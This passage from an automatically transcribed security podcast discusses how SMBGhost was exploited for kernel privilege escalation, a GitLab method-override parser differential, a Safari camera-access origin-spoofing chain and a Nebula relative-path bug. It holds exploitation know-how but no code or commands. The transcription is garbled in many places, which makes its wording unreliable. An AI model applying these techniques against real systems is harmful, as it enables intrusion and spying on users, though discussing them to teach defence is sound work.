as well. So\", \"start\": 4393.1}, {\"speaker\": 1, \"line\": \" well, so two of them they said were lesser. If she it was also what did they say here?\", \"start\": 4399.0}, {\"speaker\": 3, \"line\": \" Oh, they actually gave it a nine point three. They said successful exploitation may lead to code execution on yes. So yeah it is it is possible according to the CDE. So\", \"start\": 4409.8}, {\"speaker\": 1, \"line\": \" yeah, so the CV though, they don't necessarily actually prove that it's just okay. This is the type of issue that can so we're going to write it as\", \"start\": 4419.7}, {\"speaker\": 3, \"line\": \" this\", \"start\": 4429.7}, {\"speaker\": 1, \"line\": \" I mean obviously may allow denial service condition. Which\", \"start\": 4432.1}, {\"speaker\": 3, \"line\": \" but I think we'll see he is a CDA he's are often accurate with how impactful they are. At least from like the\", \"start\": 4435.9}, {\"speaker\": 1, \"line\": \" past well said power Thursday Dia advisories like a separate zi D zi - thing that if we could have expected for this issue.\", \"start\": 4442.1}, {\"speaker\": 3, \"line\": \" Yeah, that's what I was looking at it. So I was\", \"start\": 4451.5}, {\"speaker\": 1, \"line\": \" like I was looking at the VMware one. I do see the other one. Here. I see is seven point eight four. ortho on the VMware reporting\", \"start\": 4454.2}, {\"speaker\": 3, \"line\": \" Oh, yes, the CDE has a different sea of a cdss than the zi things. That's kind of interesting. But they do say attacker can leverage this vulnerability to escalate Privileges and execute code in the context of the hypervisor. So\", \"start\": 4467.7}, {\"speaker\": 1, \"line\": \" yeah, like my understanding of what zi would be doing is they would generally be buying it if it were an actual issue like if it were exploitable. Like at least two doing that whether like you would need to provide a aslr bypass or anything like that. But you would at least my understanding was you would need to at least provide like he'd now showing it to you know enough to do a proof of concept. Yeah up here are IP\", \"start\": 4479.4}, {\"speaker\": 3, \"line\": \" Control? Yeah, something like that.\", \"start\": 4508.7}, {\"speaker\": 1, \"line\": \" So I'd argue that there probably is some way to music. Oh, yeah. Good question smile on the get along longer discussion ahead of expected.\", \"start\": 4511.5}, {\"speaker\": 3, \"line\": \" Yeah. Yeah, we'll leave that leave that as an exercise. So anybody wants to try to exploit that\", \"start\": 4521.7}, {\"speaker\": 1, \"line\": \" yeah. If you want answer that question, you know we can't do it but are we can't answer for you but just spend all the time you want on it all those hours and let us know.\", \"start\": 4526.3}, {\"speaker\": 3, \"line\": \" Yeah, so we'll move on so unlike this article our next one does focus on exploiting a known bug and this this next post focuses on exploiting the SMB V3 vulnerability that was patched by Microsoft last month the name vulnerability SMB ghost. So there were some pocs out the for this bug before But all of them were they were basically just denial-of-service pocs. Nothing forgetting code execution though. The advisory said the code execution was possible because they labeled it as an RC e so this post explores how they actually exploited it to get code execution and not just a Das. So first the detail the specifics of the bog or rather I should say bugs because there's multiple cascading integer overflows in this code. So for those who are watching we can bring up The code on the screen here and you can cause overflows on two different fields in here that can cause like propagate issues further down the line. One of them is on the offset field and the other one is on the original press segment size field and after these guys played with different combinations of overflows for these two Fields. They found the most promising combination was to use a reasonable offset value, but a very large original compressed segment size value and what would happen here is due to the integer. With the addition statement the allocation when it up being\", \"start\": 4537.0}, {\"speaker\": 1, \"line\": \" smaller than yeah so Fields, I do want to interrupt you really quickly and just kind of mention what's going on with this. So you get the SMB packet that comes in and it contains the raw data and obviously it's most that most particles do it includes a header that header your actual data the raw data may be compressed. It may not be or maybe it is always compressed because this sorry this is Function in particular is dealing with stuff as always compressed. It's decompressing the data. So it'll take that raw data. It will allocate a new buffer and then it will take the compressed data. It'll decompress it into that buffer and then it will prepend the raw data any data that was in there. That wasn't compressed. So that's where the header offset is basically saying like all the data before this offset. That's just it's basically it's providing the offset into the data block to where the compressed data starts. So all the information before that offset just gets men copied right into the buffer to the start of the buffer and the compressed that is the compressed into the new buffer starting at that offset. So just to kind of explain something valleys there like the offset is how far into the data block the data that is compressed. That is the original compressed data size value or field is of course, the original compressed data size are segment size, which I think is self-explanatory. And obviously you can control both of those in the header. So deciding all the proof of Concepts just gave it, you know, 0x F of f so minus 1, which of course are like the biggest Value possible or minus one if it's signed effectively overflowing the integer causing a crash when I would try and access this memory eventually or try and write to memory there sir. You can go on though with your explanation.\", \"start\": 4619.7}, {\"speaker\": 3, \"line\": \" Yeah. So like you were saying the POC is a were out there were just a DOT because they used a very large value. We would write way out of bounds of the buffer, but they ended up, you know controlling it more because you do have quite a degree of control over that value and They found that they could actually smash the header that you were talking about of the packet on the Heap. And so they were originally going to try to trigger a use after free because there's a piece of code in the snippet that was on screen that would trigger a free on a certain condition and they were going to try to force that condition with memory corruption, but when they tried it they accidentally ended up finding a far better route to exploit this and they basically found that the decompressed function that gets called updates the final. Sighs value to the compressed buffer size. So the mem copy down below is hit and then they can actually control what buffer is used for that mem copy for the sore for the destination so they can basically get an arbitrary right through the mem copy. So, you know\", \"start\": 4746.1}, {\"speaker\": 1, \"line\": \" the answer so I do want to add in a little bit that they're a little bit I think you kind of skipped over. Okay, so when they have the user buffer, obviously there's that Target buffer that's been allocated. They kind of control the ultimate size of that as we've mentioned because they control you know, the size of the data. That's when we dealing so they know what the size is going to be. So what they're able to do is they control that in such a way that the It can be allocated in several different locations and they talked about this a little bit as I believe there is a pool forward and there's a look aside list for some it all comes down to the different sizes larger. So large applicate our sorry large allocations will just fail anything larger than 16 megabytes medium allocations larger than 1 Megabyte less than 16. We'll use this buffer pool and smaller ones less than Meg will use the look aside list the look aside list that they Implement here includes Med information in line. With the Heap data, so they show it on screen here you end up having the user buffer that gets returned every turns this object that includes a pointer to the actual user buffer and following that buffer at the end of the buffer is an allocation header structure that includes that is kind of the object that gets returned. So Avery turns that allocation header and that includes a pointer over to the user buffer rather than just returning that user buffer, so it's not Not it's not working quite like Matlock. If you're just expecting to return a block of memory returns an object that Sorry, I was distracted by the comment and chat, which I definitely want to deal with after I keep talking about this. But anyway, so the allocation header struck is where they get if I come back up here is where they get the user buffer. Address for so you control the decompressive data or sorry you control the raw data in the packet that's going to be copied to that location. And because the Overflow that you can get with the decompression, When it's decompressing the data you control what that pointer is pointing to. So you control the data that's going to write and you control because of overflowing that metadata in the heat in the heat that they create you control the address. So I just wanted to cover that little detail. That's their overriding an address in kind of like the Heap metadata not in the protocol header.\", \"start\": 4807.2}, {\"speaker\": 3, \"line\": \" Yeah, so, you know when you have arbitrary right in the kernel, it's basically game over that's a very like it's stupidly powerful primitive and they ended up using it. Trick published in 2012, which is basically leaking the address of the current process token with Antiquated system information. And then you just write your own token in there to privilege escalate. So I know we do want to address the common from chat with but they only got LP e naught RC E. I think that that might be like a Miss naming on their part because I this should be able to be rce\", \"start\": 4973.6}, {\"speaker\": 1, \"line\": \" aboard so this the DHCP server that's been used here. This is the VMS. Yes. DHCP server. It's not not necessarily hitting out on the network with this is it's what all the VMS are going to be using. So it's a Guess The Host Escape. It's what the VMS are able to communicate with to get like their internal IP address and like kind of on the internal VM to network. So I think that's why it's being listed more as a privilege escalation rather than our seeks this isn't something that you're hitting just somebody I looked on the random network is at least not necessarily you probably can't expose it to do so, but I don't imagine that's the default and thus they listed at it more as LP rather than\", \"start\": 5007.8}, {\"speaker\": 3, \"line\": \" RC. The VM like the DHCP or you are you completing with the last two because I don't see any I didn't see any mention of like DHCP or anything in\", \"start\": 5054.2}, {\"speaker\": 1, \"line\": \" the so sorry. I thought he was talking about I thought he was making that responds to our zi D i1 not to this bug.\", \"start\": 5064.8}, {\"speaker\": 3, \"line\": \" No, I think it's really nice. But because our originally say at the top that you know, the advisory said that this was an RC e or it could be RC eat, but their title they have exploiting it. For local privilege escalation. So now I think there was some to think\", \"start\": 5073.5}, {\"speaker\": 1, \"line\": \" he's in there. I'm sorry. I thought that was still a follow up with the with the last topic. See ya\", \"start\": 5088.5}, {\"speaker\": 3, \"line\": \" actually. I think it's just like a Miss naming on their part. I think they was like like I was saying like this issue should absolutely be able to be hit remotely. So I don't I think it should be a remote privilege escalation. Not a local\", \"start\": 5096.1}, {\"speaker\": 1, \"line\": \" pretty amazing. They're only making it or maybe they're only mention as local privilege because they are. While I was going to say because they're just doing this LPE trick. Yeah, I'm not sure actually that's a good point.\", \"start\": 5109.6}, {\"speaker\": 3, \"line\": \" You know what it may actually be because of the route they took so the arbitrary right getting to that point is probably hittable remotely. But I think the trick they use that I mentioned with getting the current process token with NT query system information. That's something that you need local access to be able to do so, I think well,\", \"start\": 5127.2}, {\"speaker\": 1, \"line\": \" but you're getting get from the exploit your our well, no, I guess it's yeah, I see what you mean. So you wouldn't be able to arbitrary right in kernel to yeah, it's not a user. It's I was initially thinking okay, so our C and then they use that escalate but yeah,\", \"start\": 5143.7}, {\"speaker\": 3, \"line\": \" yeah, so I think that's what it is. It could be hit remotely but they hit it locally because of the trick they use but arbitrary Colonel right is honestly such powerful primitive that there is no doubt a way that you could do it remotely. It's probably just a bit harder, but it's probably it's probably doable. So yeah, they're specific exploit was LPE. It could be turned into an RC. I think so. Yeah, I think that's what's happening there. That being said, I don't think I have much more to add on that. I think we can move on to exploiting parts are differentials and get lab so our next issues directly and get lab and it's from their file upload functionality it seems and it's kind of a cool attack because it's similar to the HTTP desync attacks. We've covered on the past because the issue is a discrepancy between how to of their servers get lab work horse and get Rails interpret HTTP requests.\", \"start\": 5163.9}, {\"speaker\": 1, \"line\": \" Yeah, I mean both definitely kind of follow from that same basic idea is a mentions there a actually what it different parser differentials where one process something differently than the other it's like it follows from the same thing the attacks pretty different but conceptually like it comes from that same sort of all the desync between the same for the differentials. Yeah.\", \"start\": 5215.0}, {\"speaker\": 3, \"line\": \" Yeah, so what it seems is when you upload a file at first goes through the Workhorse which has roots to find four different HGTV\", \"start\": 5240.3}, {\"speaker\": 1, \"line\": \" Magazine. Of course, is there reverse\", \"start\": 5248.9}, {\"speaker\": 3, \"line\": \" proxy? Yeah, so when this request is received the Workhorse upload the file onto the disk and tells get lab rails, which is their back end where the file is placed and this is all managed internally. So it's not like a user can Define any path of where that file is written to on the disk, you know, it's managed by Get lab work horse. So the work horse Takes that request upload the file and then it rewrites the request and passes it off to get lab rails with the proper path. Now. Normally it wouldn't be possible to control any of the put request from Workhorse to rails as that's all handled internally, but there's an issue due to the method override functionality.\", \"start\": 5250.5}, {\"speaker\": 1, \"line\": \" Well, so I think should also mention here is that we're course is as it's a reverse proxy. Oxy it handles some requests. Some of them get do get Modified by Workhorse of this example of all the pull request to the API packages / Conan and whatever path following that all of those end up getting dealt with are getting Modified by Workhorse and then kind of turn into another request that hits the main rails application or the main rails API, but if you unmatched routes and up just being Passed on unmodified two rails. Yeah, that's kind of an important detail here where the desync happens is Workhorse has no knowledge of this method override whereas rails by default has this rack method override middleware that looks for underscore method as a parameter or X HTTP method override as a header, and we've talked about issues with method overrides before. Yep. We have it's definitely it's A common method for I mentioned with dealing with fire web application firewalls that might not be aware of it, you know kind of a similar deal here with the reverse proxy. It's not aware of that. So it seeing it seeing you know, probably a post request or something like that coming through like okay. I don't know how to handle this post request. So I'm not going to worry about it whereas as web servers like oh, hey, I got a pull request because it's get it gets overwritten so you can kind of Maybe start to see where this is going. We're now if you're able to override that request sending some that doesn't get Modified by Workhorse but is still treated as a put a request in the rails application. You might be able to get to start working with another file. Yeah any file. Well, not quite any file. So actually the rails application doesn't completely trust. Just what it gets it actually has a wife list of acceptable paths and it also had slash temp to that but they have a whitelist. So even with that they still kind of protect the endpoint a bit. They don't just trust Workhorse to give it exactly what it needs. Nonetheless. Basically you can still get it to work with basically any file that exists in slash temp or any other acceptable directory. So you would have to know some of those file names you can make some guesses. Is about what might end up in temp? But you would have to know that actually abuse this issue. But it's I mean that's kind of the gist of it is you're able to make that direct request because it passes right through\", \"start\": 5292.5}, {\"speaker\": 3, \"line\": \" the they say if it was possible to do path traversal on that.\", \"start\": 5463.3}, {\"speaker\": 1, \"line\": \" Well, that's what I was saying. They validate the path. Yeah, I like in reason the rails application. They validate what the path is. So if you escape out of that path. It's not going to it's no longer going to match the expected like allowed\", \"start\": 5467.5}, {\"speaker\": 3, \"line\": \" paths. Okay, fair enough\", \"start\": 5484.2}, {\"speaker\": 1, \"line\": \" like basically, so I'm I guess they use followed on real path and I'm not sure of\", \"start\": 5486.5}, {\"speaker\": 3, \"line\": \" front\", \"start\": 5493.1}, {\"speaker\": 1, \"line\": \" if that will resolve like exactly how that results. So I'm going to imagine that that should resolve any relative links or anything like\", \"start\": 5497.3}, {\"speaker\": 3, \"line\": \" that. Okay.\", \"start\": 5507.5}, {\"speaker\": 1, \"line\": \" Yes, it Returns the absolute path name. So that's basically exactly how you should be validating file paths. Don't bother just checking. You know, we're basically resolve it to its absolute file name and then just check the start of have make sure the path matches what you expect it to be. Don't try and do what don't look for like dot dot slash or dots or try and remove that don't do anything fancy and weird. Just get the absolute path and see Matches where you want it to be within? So anyway, yeah, so they do that. So basically they're checking that real path. So they get the absolute path and then they compared it with the upload paths. They allow and they also and the slash temp if it's not in there. It gets rejected. Yeah, so you can you can't get out of it. You need to it's only files with in Tampa or within the allowed\", \"start\": 5513.2}, {\"speaker\": 3, \"line\": \" path. Okay fair enough, so they obviously fix the issue and how they fixed it as what they do now is they sign the request from Workhorse to rails. So even if you try to do these kinds of sneaky requests using the method override since you can't sign that request it won't pass the validation and it won't be respected and you know, it just won't run.\", \"start\": 5570.7}, {\"speaker\": 1, \"line\": \" Yeah, I mean that feels like a bad solution to me. It's a definitely working solution. Like there's no immediate way around that but in order to implement that because obviously some requested do need to pass through I'm assuming that not every the reason they even have that Pastor to begin with is some requesters don't really need to be modified by the Workhorse. Like they just need to be passed through so it's not going to sign those requests presumably. It's only going to sign the ones that work horse goes ahead and actually modify. Its or that things that actually need a pastor War Horse which means on the rail side or somewhere there needs to be either a white list of routes that can be processed without a signature or all the functions need to check that signature like there needs to be some way for its know what methods are OK or not. OK\", \"start\": 5592.1}, {\"speaker\": 3, \"line\": \" assume you're saying it's possible. They could miss\", \"start\": 5652.5}, {\"speaker\": 1, \"line\": \" one. Yeah. Well, that's the thing when you chew. That's exactly what I'm thinking is eventually somebody's just going to mistakenly Miss some endpoint or something if they've implemented how and think maybe they've thought of something else that just then come to mind when I was reading that but my initial thought was that there need to be some list that gets maintained here now, perhaps they could sign it with Like in the signature like they can include some meta information that then allows it to know kind of the URL that it thinks Workhorse signed. So then that could be done at a universal layer where it's just looking like is the signature like does the signature match that URL like signing the URL basically, so then if it ends up being a different type of request that a little get caught there so I could see some ways that's being done. It just feels like a weird solution to me. Yeah, that's it. I guess I could probably go find out what it's doing. I didn't think about this what guess Lab at least some of it is open source. So, yep.\", \"start\": 5654.2}, {\"speaker\": 3, \"line\": \" Yeah, I think they even linked to like a GitHub page or something that had some of their code on it.\", \"start\": 5720.1}, {\"speaker\": 1, \"line\": \" So really I think so. I'm saying really on the fact that gift lab link to GitHub.\", \"start\": 5724.6}, {\"speaker\": 3, \"line\": \" Oh, sorry. Okay. No, I think they link to like a source page on gitlab. Yeah, I shouldn't have said GitHub.\", \"start\": 5732.3}, {\"speaker\": 1, \"line\": \" Yeah fair enough that but that's what I was saying really to like they expose that over on GitHub or get lab. Yeah. It's probably somewhere I'm gonna guess get lab.\", \"start\": 5737.9}, {\"speaker\": 3, \"line\": \" Yeah, I don't have to get loud be linking to get Hub baby pretty\", \"start\": 5749.2}, {\"speaker\": 1, \"line\": \" stupid. Yeah, actually all these routes and stuff are clickable. So yeah, I'm going to assume and I could dig into it. Yeah, I think probably not going to do that here on stream though, but Yeah, it's damn. It just feels like it just felt like a weird issue or sorry a weird solution to the issue of it solution for said it's better than trying to just fix that differential alone. Like because that just is like this big cat and mouse games are cat and mouse game where oh you find this differential you fix that. Oh, well, there's this other thing that's different and there's this other thing and you just you keep adding on things just keep Keeping found that are different\", \"start\": 5751.8}, {\"speaker\": 3, \"line\": \" across them. so kind of want to show it off in the Stream because it's a unique bug and it's also when a system that a lot of people use for projects like this in small by any\", \"start\": 5798.5}, {\"speaker\": 1, \"line\": \" means and I mean the whole underscore method is definitely like it's a common enough thing that it's always worth being aware fed and seeing it being used in this way is yeah it's definitely an interesting attack so our next article\", \"start\": 5809.3}, {\"speaker\": 3, \"line\": \" is one about getting access to the camera on iOS and Mac OS devices without getting permission from the user through a web RTC bug so I'll let Z cover this one as I didn't get a chance to look\", \"start\": 5826.0}, {\"speaker\": 1, \"line\": \" into so much last webrtc and more this is Safari in particular and dealing with how Safari tracks permissions so one thing of note this is actually for what the bug is it is a very long Long and drawn-out explanation. It is the complete thought process of how we went from noticing one thing to noticing this fairly. I want to say convoluted attack method. It's a fair read like I'm definitely not hating on it for that, but it's definitely a long read. But you know as an issue like it is interesti-- like why he looked at this rather than like if this just came out as well you do these things. It would be surprising anybody ever discovered it but kind of explaining how he got there and through the entire process. It's it was still interesting. It's not like my favorite should read I did find it a bit dry and stuff. But that's also just probably partly because of the more like Javis craft and application layer versus the binary stuff, which I prefer.\", \"start\": 5835.6}, {\"speaker\": 3, \"line\": \" I'm really a low-level issue.\", \"start\": 5909.1}, {\"speaker\": 1, \"line\": \" Yeah, it's still still. I mean it it exposes a loft that thought process which I think is valuable. I kind of see how you work your way to this fairly complex issue. So starting off with something background with it on OS X and iOS. Basically you have you have the permissions for like an application access the camera needs to have permission to do so. The thing is Apple applications actually. Get that for free. Any Apple application is allowed to access the cameras allowed to basically have some prayer sir. The microphones. The other thing is allowed to access that without actioning to prompt for information. So Safari being an Apple application gets that for free, but it tracks it itself in order to prompt you for for like websites to request specific permission. So going from that that's kind of your background there. Yeah, the that's kind of the security model around. How you get x to the camera? So what this walks through is first of all, it starts looking at how to Safari. Keep track of your website's. How does it know? Why one website is how does it keep track? Thanks for same origin policy and basically they noticed and I'm not going to walk through the entire. An issue, but I'm just going to point out more some highlights, but they noticed in there that when they have like the websites listed, they'd be on like a w-w-w DOT and only example.com would show up. So they kind of notice just how you know, it's probably parsing out for the hostname and what they noticed eventually was that how would parse the host name is it would ignore the protocol so they show the example of going to fake colon slash slash example.com Arm which would count as having example.com open, so it ignored the protocol. So what it did was it would just grab between the colon slash slash and the next / to get the host name? Which kind of makes sense Until you realize that there are some protocols that are supported or pseudo protocols like file / / or blob view Source data things like that or JavaScript would be probably the more common one that don't have a host in it, but it will still load at that same way. Then they kind of talk through how they certain no Singham of some other issues like if you had a domain with a - and a DOT next to each other how it kind of bugs out, but effectively they found for example that they could use file there's a they can use file, you know Skype to Skype.com and it would be loaded as though it's origin was skype.com was the one example that kind of would come up there. However are sorry. They would use JavaScript to change location dot hopes to be skype.com rather than actually doing it in the URL. I'm said they talked about a number of different tricks that they end up using here. So they kind of worked out. So they're able to kind of get control of the origin file while the kind of worked. It doesn't support mobile. So they didn't actually go that route they kind of deep diving into blobs. But what happens with blobs is they end up talking about these opaque origin. So what happens when a blob if you're not familiar with a blob lobs are in JavaScript, you can go and do like a new blob and then give it basically a file that it's going to write and a meta or mime type for it. I can give it that information. Then you can it'll give you a uid that you can then load up as though it were an actual file were an actual URL. So just kind of creates a kind of in memory and you do that with JavaScript. So it's a little bit special. So what happens if you know, how does it get the origin for blobs? and it deep sea dives into that couldn't just You can't just create a blog from skype.com. For example kind of dives into what winds up happening eventually is he figures out that in some cases with The Blob Origins you could end up with a empty origin rather than annul origin or an opaque origin, which just doesn't quite serialize. It actually gets tray is empty were thinks the origin is literally just colon slash slash. so what ends up happening when he's able to trick the origin to be colon slash slash what she ends up only being able to deal with you in theory or he discovered it by only manually typing in the URL not by getting it through any sort of automated means although ends up using another trick to kind of get around that huge using pushstate to effectively change what that Origins up looking like, That ends up happening because you have the colon slash slash as what he thinks. is the origin so then when you use pushstate Interested if you set the push stay to skype.com. We'll just how you change the url without actually changing it's used by gesture. So Ajax stuff, you'll change the url without actually going to make a full request to a new page. You can just change the url kind of magically with JavaScript. That's what pushstate is or part of push States in particular that's changing your history versus replacing I won't go down. Path though, but because of because of finding that blank origin the colon slash slash when he sets the thing to skype.com. It's thinks he's just setting a path not changing the how the other area of safari will actually parse it as the domain being skype.com. Now it thinks it's doing something else. So it sets the path to some like skype.com something that has permission to use the camera. So basically figure out how to programmatically create a document with any sort of spoofed origin is next hurdle was getting around so you can only open the camera webrtc needs to be encrypted needs to be over in theory that's supposed to be needs to be over HTTP and practice files are one place where so file colon slash slash are one place where you'll have I'll say it's not an HTTP request, but you can still open the camera and that's because Safari will trade basically anything that has no origin the file you are eyes data. You are eyes as a secure context and that's obviously there to help developers. That's why files kind of get treated as being as here context even though it's not necessarily secure or at least not here in the sense of being over http. discovers that discovers that you can easily create that sort of opaque or gen using a pop up from a sandbox iframe So if eventually, you know using a pop up from a Sandbox iframe doesn't have any or doesn't have or has an opaque or genset. Then everything I've said above can follow and it's able to basically get your camera access which is the gist of this is any website can open and view your camera.\", \"start\": 5910.3}, {\"speaker\": 3, \"line\": \" That's a lot of work for a\", \"start\": 6392.7}, {\"speaker\": 1, \"line\": \" it's a very good thing and I know I didn't do it justice just because trying to explain everything but he walks through with like if you read through this you'll understand kind of all the details about it. It doesn't I know likes I didn't give it a really good overview there. It's Overview at the end here at The quick summary is open and evil HTTP web site. HTTP web site becomes a data URI data. URI becomes a blob URI if which The Blob you were eyes that special one that happened to be blank rather than I just being considered opaque manipulate the window history had to do that in two parts because of the because of how the thing would get parsed though Langley. Yeah Bell blank iframe document right to that to create the sandboxed iframe them from their attempt an impossible navigation using get like that X frame options won't deny. I'm from within the Frame Window dot open now are able to get your host to go into this other document that connects you JavaScript. And open the camera and that's in a secure contact.\", \"start\": 6394.3}, {\"speaker\": 3, \"line\": \" Sorry that camera access with these 15,000 easy steps\", \"start\": 6469.6}, {\"speaker\": 1, \"line\": \" only nine steps and one of them is profit according to this but that's not my point is it is a really complicated thing and that's why I feel like it's actually it was worth bringing up here. Like again, I'll say I apologize for not being able to really give that do justice to the summary. but\", \"start\": 6474.5}, {\"speaker\": 3, \"line\": \" as of right off things where it's better to read\", \"start\": 6495.6}, {\"speaker\": 1, \"line\": \" yeah, it gets he walks through how we got to every how he went through every part of the process how every step came because if we just talked about that like that just like\", \"start\": 6498.1}, {\"speaker\": 3, \"line\": \" you know, how do you realize that\", \"start\": 6509.7}, {\"speaker\": 1, \"line\": \" you know this right of goes through how do you realize that gain complicated very roundabout like it's not something that you're just going to\", \"start\": 6512.8}, {\"speaker\": 3, \"line\": \" one\", \"start\": 6524.0}, {\"speaker\": 1, \"line\": \" day decide to try like what if I do this and this and this but yeah, how know it's a good write-up for that likes it. I did feel it was a little bit on the drier side. But I mean if you're actually interested, it's yeah, it's worth the\", \"start\": 6524.2}, {\"speaker\": 3, \"line\": \" read it's got a lot of there for you if you're interested in it. Yeah, well turns out to our sorry, we're gonna have\", \"start\": 6541.7}, {\"speaker\": 1, \"line\": \" something well just by saying terms of one that doesn't have a lot there for you. We've got a hacker one report from James Hancock. This is impacting slack. I believe it was yes lock relative path vulnerability results are results and arbitrary command execution / privilege escalation. $750 Bounty for this it's not on the Like slack client this uses nebula, which is kind of this networking tool that slack has a use between quotes crate like this mutually event K peer-to-peer software defined Network. It's the language out of their GitHub repo for it. Basically created to provide like a mechanism for various groups of host communicate securely across the internet. so nebula in particular just of this issue is really simple. It uses a relative path. When does executable command? It just uses ifconfig or router on Windows uses netsh. It doesn't give the full path or the absolute path like essman ifconfig. So what that means is if you can control the binaries in the path before it finds the original one you're able to get execute. as a privileged user whatever binary you want it to run. So essentially when you call just for ifconfig, for example your systems going to lock a well as iif, it's quite look at your path environment variable. It's going to get all the folders elf that's going to go in order first folder in there is ifconfig in here. No, OK second folder and there's I've config in there. No, OK third folder. Okay. Here's ifconfig. Let's execute that. So an attacker who can place a binary of the same name somewhere in that path before Actual binaries Falcon get to be run. Straightforward issue just use the absolute paths when you're going to execute something don't assume don't assume the setup. It does require obviously somebody that can that's in a position to place a binary but\", \"start\": 6549.3}, {\"speaker\": 3, \"line\": \" Because my path as well, yeah,\", \"start\": 6685.6}, {\"speaker\": 1, \"line\": \" well or place the binary within the path you could modify path. That's the easiest way to deal with just you know, put temp in the path or something and then X here and attempt, but it just needs to be in the past somewhere. So it's like the user doesn't need to be able to do that. They just need to be able to get a file though odds are if you're able to get a file wherever you want with whatever name you want. You probably can also mess at least somewhat with the environment variables. Yeah, although that actually ends up being a point of issue that they have chat with reproducing that. So you can go ahead and just read that they had a little or the triage team had a little bit of issue actually proving. This was an issue just using pseudo because pseudo would use its own path information. It wouldn't what a huge the executing users but The difference being here that it's executing already as privilege and interest executing a Tom either way. You can read about that discussion. I didn't think it was too interesting. I just thought was worth breaking off. Yeah. This is definitely one of those combinations and it's really easy not to make use an absolute path. It's a little bit less portable. But it's better if basically happens on a lot of application and\", \"start\": 6688.3}, {\"speaker\": 3, \"line\": \" straightforward. Yeah, I mean I was a bit surprised considering like the impact is limited because you do need that level of access to pull it off this gets this question because nebula runs as root but I was a bit surprised at the Bounty was as high as it was sudden heard $50, obviously that's cool for the researcher, but it's a bit higher than I was expecting. I guess.\", \"start\": 6766.2}, {\"speaker\": 1, \"line\": \" I don't know. I mean that seems pretty fair for privilege escalation. I mean you are getting rude out effect on all the client on all the slacks clients that are actually using\", \"start\": 6787.0}, {\"speaker\": 3, \"line\": \" Nebula. Yeah, that being said the severity was taken down. I think initially it was high but before disclosure, they knocked down a bit because of the level of access required to pull it off. So we'll get into some research. It's been a few episodes since we've had a paper. So we're going to cover paper the talks about our favorite types of papers, which is an adversarial attacks against lidar order light detection and ranging detectors for self-driving Vehicles. We love we love self-driving vehicles on day. Zero,\", \"start\": 6799.8}, {\"speaker\": 1, \"line\": \" so yeah. Also, I like talking about these issues that can really happen. Basically. Yeah,\", \"start\": 6829.3}, {\"speaker\": 3, \"line\": \" there's definitely more of a real-world type of talk\", \"start\": 6839.2}, {\"speaker\": 1, \"line\": \" and just to be fair we have had we did have a paper. I want to say like two episodes ago maybe but hasn't been that long since we have haven't had paper but anyway with this one it's they called a physically realizable adversarial examples for lighter object detection it is not they don't actually realize it physically this they just they do all this digitally to see how it would detect something they don't actually pull this off which is unfortunate but I do like talking about the ones that could be done in the real world it's not it doesn't require access to the Imaging system\", \"start\": 6841.8}, {\"speaker\": 3, \"line\": \" as yes every wire access to the can bus or anything like that\", \"start\": 6888.8}, {\"speaker\": 1, \"line\": \" well I just meant like yeah sometimes the attacks will assume when they're working against the camera in particular you know those whom they can just modify all the pictures Clean like make minor Pixel Perfect modifications. This doesn't this assumes you could put effectively that you could put something on your roof and it will no longer detect you as a car. Yeah, which is the gist of this thing what they noticed was that a lot of training data doesn't include objects on roofs cars, which you know absolutely happens in the real world. Just not so much like it's a little bit uncommon so I can understand that uncommon assuming translate training data where it's just not really there. That's what they do is they digitally manipulate what the point Cloud what if look like and see how it gets detected and I will jump pretty much right to the results unless you have something to say about it Specter.\", \"start\": 6891.9}, {\"speaker\": 3, \"line\": \" I'd wanted to say this this like idea of investigating this route of attacking object detection doesn't seem to be new they do point out to some previous work that was done on it though. They point out that a lot of that previous work was theoretical the attack was using adversarial Point clouds like you were talking about but that match was only being considered for like a few specific frames not like universally for like any scene and the data set was also like very small. So what they're doing isn't entirely like new it has been looked into before but it seems to be like more universally applicable than some of the other papers that have covered it. But yeah, you know,\", \"start\": 6949.7}, {\"speaker\": 1, \"line\": \" yeah, I have to imagine like a lot Of these systems are like they don't have the model that Tesla uses. For example, they are basing that's just off of a more generically trained model and so it is worth pointing out like just because they find these issues doesn't mean it's like, oh, well the next test like you buys necessarily going to do the same thing. This is yeah worth worth mentioning that but getting just right down to it. Basically they just mocked up different objects that could be on your roof and well they started by just mocking him up to see what a would get classified as and it actually did a reasonable job at Detecting the vehicle despite the fact that there is also a couch on the roof or a canoe on the roof, which I you could expect reasonably that\", \"start\": 6992.4}, {\"speaker\": 3, \"line\": \" I don't know. What a couch but it's a canoe. Yeah.\", \"start\": 7049.6}, {\"speaker\": 1, \"line\": \" Well, I was quite sorry. I was going to say you could expect reasonably that it should be able to handle nothing you could necessarily expect to see it just that it should be able to kind of handle that so then with a little bit of adversarial changes on it's still things that you could do. Do but it looks like you know, the canoe was a little bit malformed or whatever. They found a much greater degree of success like with their adversarial couch. The car would be detected as a couch 68% of the time. So there you are. Just just going down the freeway in your cabinet 54.1% of the time. So yeah, I mean it's it's a straightforward attack here. It's similar to other things we talked about. I just love the idea of you know your self driving car thinking the thing next to you was a cabinet and not a car.\", \"start\": 7052.4}, {\"speaker\": 3, \"line\": \" I think it's kind of neat because a lot of the adversarial attacks we cover are done intentionally, but this is kind of showing you could do it intentionally, but it's also possible that just very benign things that people do like putting a canoe on top of their car, which I see. All the time in the summer could end up fooling these systems something, you know, it's not necessarily intended to fool those detectors, but it could end up\", \"start\": 7108.6}, {\"speaker\": 1, \"line\": \" doing yeah, it could obviously their results that were last like the canoe in particular was 26.9% but it's really clear but the adversarial one was definitely a lot higher. Yeah, it's still there.\", \"start\": 7132.0}, {\"speaker\": 3, \"line\": \" Yeah, and the adversarial ones. They're kind of like they are may be possible. It probably wouldn't physically Work out if you try to do it and you'd probably get pulled over for an unsafe low, but some of these images they have / but you know, it just it's kind of interesting because like you said a lot of the ones we've covered if dealt with like doody modifications, like direct pixel modifications or putting something over stop signs or something like that. It doesn't really deal with I do like the refund ones\", \"start\": 7145.3}, {\"speaker\": 1, \"line\": \" actually boiling like I\", \"start\": 7175.0}, {\"speaker\": 3, \"line\": \" mean thing this one's different from those.\", \"start\": 7176.8}, {\"speaker\": 1, \"line\": \" Yeah. No, well. I just like the fact that it is some that could in theory. I have to say it. Theory be done for real in theory be done in practice. It is different from a lot of those attacks. So like I'm not a big fan of those attacks that do require direct access to the data itself being processed. So that's kind of where we're I think this one's kind of different. Yes in this paper. They do directly manipulate that data. I just think they do it in a fair way, you know, they're trying to simulate when you could really do so, I think that's fair like said, you might get pulled over for something unsafe loads, but at the same time You know, you're probably not doing this and just driving down the freeway for hours. It's probably if you were willing to use this and I mean, I don't know if any actual campaign or anything that would have done something like this. Like I guess it wouldn't be a 